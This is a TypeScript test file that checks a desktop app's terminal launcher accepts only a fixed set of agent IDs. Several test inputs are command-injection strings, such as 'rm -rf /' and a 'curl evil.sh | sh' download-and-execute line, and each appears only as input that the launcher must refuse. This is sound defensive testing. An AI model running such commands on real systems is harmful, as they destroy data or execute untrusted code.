/**
 * @vitest-environment node
 *
 * CGLAB-169: which agent a terminal may launch.
 *
 * This is a security boundary, not a config list. The renderer runs the same
 * bundle a browser would, so if it could name the executable, an XSS in that
 * bundle would be arbitrary code execution on the user's machine with their
 * shell and their credentials. The renderer therefore picks an ID out of a
 * closed set and the main process maps that ID to a command — never the other
 * way round.
 *
 * The set is also not free-form: it is what AgEnFK actually integrates with.
 * Offering an agent the framework does not support produces a terminal that
 * opens onto "command not found", which reads as a broken app rather than as a
 * missing install.
 */
import { describe, it, expect } from 'vitest';
import * as fs from 'fs';
import * as path from 'path';
import { fileURLToPath } from 'url';
import {
  AGENT_IDS, resolveAgentCommand, listAgents, canResume, canDictateSessionId,
} from '../main/agents';

const repoRoot = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '../../../..');

describe('what belongs in the agent list', () => {
  // The criterion is what AgEnFK INTEGRATES WITH — never what happens to be
  // installed on the machine running the tests.
  //
  // The first cut got this wrong by treating the CLI's INTEGRATION_LABELS as
  // the source of truth. That map omits pi, so pi was excluded; and it lists
  // opencode, so opencode was included. Both were wrong. What the project
  // actually ships is the answer: rule bundles (clauderules, codexrules,
  // cursorrules, geminirules) and, for pi, a native extension installed by
  // scripts/install.mjs into ~/.pi/agent/extensions/.

  it('includes pi, which AgEnFK gives a native enforcement extension', () => {
    // scripts/install.mjs copies bin/agenfk-pi-extension.ts into
    // ~/.pi/agent/extensions/ — pre-edit gatekeeper, mcp-enforcer and
    // PR-sizing, enforced natively rather than instructionally. That is a
    // deeper integration than most entries in INTEGRATION_LABELS, which does
    // not mention pi at all.
    expect(AGENT_IDS).toContain('pi');
  });

  it('ships a rules bundle or an extension for every agent offered', () => {
    // The real rule, derived instead of restated: an agent belongs here only
    // if this repo integrates with it. Reads the tree, so adding an agent
    // without shipping anything for it fails.
    const repoRoot = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '../../../..');
    // The bundle directory drops the vendor suffix: claude-code ships
    // clauderules/, gemini ships geminirules/. One entry, not a second map —
    // parallel lists are exactly what this whole change removes.
    const bundleFor = (id: string) => id.replace(/-code$|-cli$/, '');
    for (const id of AGENT_IDS) {
      if (id === 'shell') continue;
      const stem = bundleFor(id);
      const hasRules = fs.existsSync(path.join(repoRoot, `${stem}rules`));
      const hasExtension = fs.existsSync(path.join(repoRoot, 'bin', `agenfk-${stem}-extension.ts`));
      expect(
        hasRules || hasExtension,
        `"${id}" is offered but this repo ships neither ${stem}rules/ nor bin/agenfk-${stem}-extension.ts`,
      ).toBe(true);
    }
  });

  it('offers the agents AgEnFK ships an integration for', () => {
    for (const id of ['claude-code', 'codex', 'gemini', 'pi']) {
      expect(AGENT_IDS).toContain(id);
    }
  });

  it('leaves cursor out — it is an editor, not a CLI to run in a terminal', () => {
    // AgEnFK integrates with Cursor, but there is nothing to spawn in a PTY;
    // enforcement there is instructional (see AFK_ARCHITECTURE.md). Listing it
    // would put an option in the menu that cannot work.
    expect(AGENT_IDS).not.toContain('cursor');
  });

  it('leaves opencode out', () => {
    // A product decision, and consistent with the tree: there is no
    // opencoderules/ bundle and no pi-style extension for it — only three
    // hook plugins. Whether the binary happens to exist on any given machine
    // is not the question this list answers.
    expect(AGENT_IDS).not.toContain('opencode');
  });

  it('every entry names a bare executable, never a path', () => {
    // The property that actually matters for the list as a whole: an entry
    // carrying a path would defeat the closed-set indirection this file exists
    // for, by writing the path down on OUR side instead of theirs.
    for (const id of AGENT_IDS) {
      const { file } = resolveAgentCommand(id);
      expect(file, `"${id}" resolves to a path rather than a bare name`).not.toMatch(/[/\\]/);
      expect(file.length).toBeGreaterThan(0);
    }
  });

  it('defaults to Claude Code', () => {
    expect(AGENT_IDS[0]).toBe('claude-code');
  });

  it('offers a plain shell as the last resort', () => {
    // Not an agent, but the thing a user wants when no CLI is installed or
    // they just want to run git in the worktree.
    expect(AGENT_IDS).toContain('shell');
  });
});

describe('resolving an id to a command', () => {
  it('maps a known id to a command the main process chose', () => {
    const resolved = resolveAgentCommand('claude-code');
    // The ID is the harness vocabulary; the EXECUTABLE is still `claude`.
    // Those are allowed to differ — what must not is having two id sets.
    expect(resolved.file).toBe('claude');
    expect(Array.isArray(resolved.args)).toBe(true);
  });

  it('refuses an id that is not in the set', () => {
    expect(() => resolveAgentCommand('definitely-not-an-agent')).toThrow(/unknown agent/i);
  });

  it('refuses an absolute path', () => {
    // The attack this whole indirection exists to stop.
    expect(() => resolveAgentCommand('/bin/sh')).toThrow(/unknown agent/i);
  });

  it('refuses a relative path that climbs out', () => {
    expect(() => resolveAgentCommand('../../usr/bin/env')).toThrow(/unknown agent/i);
  });

  it('refuses a command with shell metacharacters', () => {
    // node-pty takes file + argv and does not go through a shell, so this is
    // already inert — but an id that is not in the set must be refused on that
    // basis alone, before anyone reasons about quoting.
    expect(() => resolveAgentCommand('claude; rm -rf /')).toThrow(/unknown agent/i);
    expect(() => resolveAgentCommand('claude && curl evil.sh | sh')).toThrow(/unknown agent/i);
  });

  it('refuses an empty or non-string id', () => {
    expect(() => resolveAgentCommand('')).toThrow(/unknown agent/i);
    expect(() => resolveAgentCommand(undefined as unknown as string)).toThrow(/unknown agent/i);
    expect(() => resolveAgentCommand(null as unknown as string)).toThrow(/unknown agent/i);
  });

  it('never derives the command from the id by string manipulation', () => {
    // A mapping built as `{ file: id }` would pass every test above while
    // still being a lookup of attacker-controlled text. Every id must resolve
    // to an entry that was written down.
    for (const id of AGENT_IDS) {
      expect(() => resolveAgentCommand(id)).not.toThrow();
    }
    // A casing variant is not in the set, so it must be refused rather than
    // normalised into one.
    expect(() => resolveAgentCommand('CLAUDE')).toThrow(/unknown agent/i);
  });
});

describe('listing agents for the picker', () => {
  it('gives every agent a label a person can read', () => {
    for (const agent of listAgents()) {
      expect(agent.id).toBeTruthy();
      expect(agent.label).toBeTruthy();
      expect(agent.label).not.toBe(agent.id);
    }
  });

  it('lists them in menu order, with the default first', () => {
    expect(listAgents().map(a => a.id)).toEqual([...AGENT_IDS]);
  });
});

describe('auto-approve, the flag that turns off the agent\'s own safety rails', () => {
  it('is off unless explicitly asked for', async () => {
    // The default has to be the safe one. An agent running with permissions
    // skipped can edit, delete and push without asking, so this must never be
    // something a caller gets by forgetting a parameter.
    expect(resolveAgentCommand('claude-code').args).not.toContain('--dangerously-skip-permissions');
  });

  it('adds the real flag for an agent that has one', () => {
    const args = resolveAgentCommand('claude-code', { autoApprove: true }).args;
    expect(args).toContain('--dangerously-skip-permissions');
  });

  it('keeps multi-token flags as separate argv entries', () => {
    // codex needs several arguments. Passing them as one string would have the
    // whole thing delivered as a single argv element, which the CLI reads as
    // one nonsense option rather than as the settings intended.
    const args = resolveAgentCommand('codex', { autoApprove: true }).args;
    expect(args.some(a => a.includes(' ')), `an argv entry contains a space: ${JSON.stringify(args)}`).toBe(false);
    expect(args.length).toBeGreaterThan(1);
  });

  it('silently does nothing for an agent with no such flag', () => {
    // Inventing one would be worse than ignoring the request: a wrong flag
    // either fails the launch or, worse, means something else entirely.
    expect(resolveAgentCommand('gemini', { autoApprove: true }).args)
      .toEqual(resolveAgentCommand('gemini').args);
  });

  it('reports which agents can actually honour it', () => {
    // So the UI can disable the toggle with a reason instead of offering a
    // control that quietly does nothing.
    const byId = new Map(listAgents().map(a => [a.id, a]));
    expect(byId.get('claude-code')?.supportsAutoApprove).toBe(true);
    expect(byId.get('gemini')?.supportsAutoApprove).toBe(false);
    expect(byId.get('shell')?.supportsAutoApprove).toBe(false);
  });
});

describe('the agent list has exactly one source of truth', () => {
  it('matches the ids the server validates against', async () => {
    // Two lists exist on purpose: the ids are shared (core) because the server
    // must validate a recorded session against them, while the COMMANDS stay
    // here, in the package that is the security boundary for what gets
    // spawned. What must never happen is the two drifting — an id the server
    // accepts but this package cannot launch fails at restore, and an id this
    // package launches but the server rejects cannot be recorded at all.
    const { TERMINAL_AGENT_IDS } = await import('@agenfk/core');
    expect([...AGENT_IDS].sort()).toEqual([...TERMINAL_AGENT_IDS].sort());
  });
});

/**
 * Resuming a conversation (CGLAB, session resume for all available agents).
 *
 * We DICTATE the id rather than discovering it: a uuid is generated here and
 * handed to the agent on a fresh spawn, so the same id resumes it later. That
 * is what makes this work on the very first terminal, with no hook installed
 * and nothing to parse out of the agent's output.
 *
 * The three installed CLIs were checked with `--help` on a real machine rather
 * than copied from a reference implementation, and they do NOT share a shape:
 *
 *   claude  --session-id <uuid>       -r/--resume <id>     flags
 *   pi      --session-id <id>         --resume <id>        flags
 *   codex   (no way to dictate)       codex resume <id>    SUBCOMMAND
 *
 * codex is why this is modelled as an argv TEMPLATE PER MODE rather than a
 * resume flag appended to the end: its resume is a subcommand and comes before
 * everything else. A flag-shaped design works for the first two agents and
 * breaks on the third.
 */
describe('resuming a conversation', () => {
  const UUID = '3f2504e0-4f89-11d3-9a0c-0305e82c3301';

  it('tells claude which conversation it is starting, so it can be resumed later', () => {
    const cmd = resolveAgentCommand('claude-code', { agentSessionId: UUID });
    expect(cmd.args).toContain('--session-id');
    expect(cmd.args[cmd.args.indexOf('--session-id') + 1]).toBe(UUID);
  });

  it('resumes claude by DIRECTORY, because resuming by id can fail', () => {
    // Verified against the real CLI: `--resume <id>` answers "No conversation
    // found with session ID" when the id was never persisted, and claude only
    // persists a conversation once there has been an exchange. Since the id is
    // recorded at spawn time, a terminal opened and closed without the agent
    // saying anything produced exactly that failure — and refusing to start is
    // worse than starting fresh.
    //
    // `--continue` is "the most recent conversation in the current directory",
    // and every card here has its own worktree, so that IS this card's
    // conversation.
    const cmd = resolveAgentCommand('claude-code', { agentSessionId: UUID, resume: true });
    expect(cmd.args).toEqual(['--continue']);
    expect(cmd.args).not.toContain('--resume');
  });

  it('never passes claude an id it would reject', () => {
    // `claude --session-id <existing>` is an error: "Session ID is already in
    // use". So the create flag must appear on a FRESH spawn only.
    expect(resolveAgentCommand('claude-code', { agentSessionId: UUID, resume: true }).args)
      .not.toContain('--session-id');
  });

  it('resumes pi with the same flag it was created with', () => {
    // pi's `--session-id` is documented as "creating it if missing", so one
    // flag covers both modes: first spawn creates, second reuses.
    //
    // Deliberately NOT `--resume`. pi's `--resume, -r` is "Select a session to
    // resume" and takes NO argument — it opens an interactive picker, and
    // `--resume <uuid>` would have shown the user that picker while handing pi
    // the uuid as a prompt. This file previously asserted `--resume` because it
    // was written by pattern-matching claude's flags rather than reading pi's,
    // which made the test agree with the bug instead of catching it.
    expect(resolveAgentCommand('pi', { agentSessionId: UUID }).args).toEqual(['--session-id', UUID]);
    expect(resolveAgentCommand('pi', { agentSessionId: UUID, resume: true }).args)
      .toEqual(['--session-id', UUID]);
  });

  it('never hands pi a flag that takes no argument', () => {
    // The specific failure: a valueless flag followed by a uuid turns the uuid
    // into a positional argument, which for an agent CLI means a prompt.
    for (const resume of [true, false]) {
      expect(resolveAgentCommand('pi', { agentSessionId: UUID, resume }).args)
        .not.toContain('--resume');
    }
  });

  it('resumes codex with a subcommand, not a flag', () => {
    // `codex resume [SESSION_ID]`. Appending a flag would make codex treat it
    // as a prompt.
    const cmd = resolveAgentCommand('codex', { agentSessionId: UUID, resume: true });
    expect(cmd.args[0]).toBe('resume');
    expect(cmd.args[1]).toBe(UUID);
  });

  it('does not pretend codex can be told its id on a fresh spawn', () => {
    // It has no flag for it. Inventing one would make codex fail to launch at
    // all, which is worse than not resuming.
    expect(resolveAgentCommand('codex', { agentSessionId: UUID }).args).toEqual([]);
  });

  it('says which agents can actually resume, rather than leaving callers to guess', () => {
    expect(canDictateSessionId('claude-code')).toBe(true);
    expect(canDictateSessionId('pi')).toBe(true);
    // True: it resumes, just not by an id we chose.
    expect(canResume('codex')).toBe(true);
    expect(canDictateSessionId('codex')).toBe(false);
    // A login shell has no conversation. Out by nature, not by omission.
    expect(canResume('shell')).toBe(false);
    expect(canDictateSessionId('shell')).toBe(false);
  });

  it('ignores a resume request for an agent that cannot do it', () => {
    // Rather than emitting a flag the agent does not know, which would stop it
    // launching.
    expect(resolveAgentCommand('shell', { agentSessionId: UUID, resume: true }).args).toEqual(['-l']);
  });

  it('refuses anything that is not a uuid, rather than escaping it', () => {
    // It goes into argv. Same posture as tmuxSessionName: refuse, never
    // escape. It is generated by us, so a bad value is a bug — and argv is
    // exactly where "it is ours, it is fine" stops being safe.
    for (const bad of ['; rm -rf /', '--dangerously-skip-permissions', '../x', 'nope', '']) {
      expect(() => resolveAgentCommand('claude-code', { agentSessionId: bad }))
        .toThrow(/session id/i);
    }
  });

  it('still honours auto-approve while resuming', () => {
    // The two are independent decisions, and dropping one on the resume path
    // would silently change how the agent behaves the second time.
    const cmd = resolveAgentCommand('claude-code', {
      agentSessionId: UUID, resume: true, autoApprove: true,
    });
    // `--continue` for claude, not `--resume` — see the directory-scoped
    // resume above.
    expect(cmd.args).toContain('--continue');
    expect(cmd.args).toContain('--dangerously-skip-permissions');
  });
});
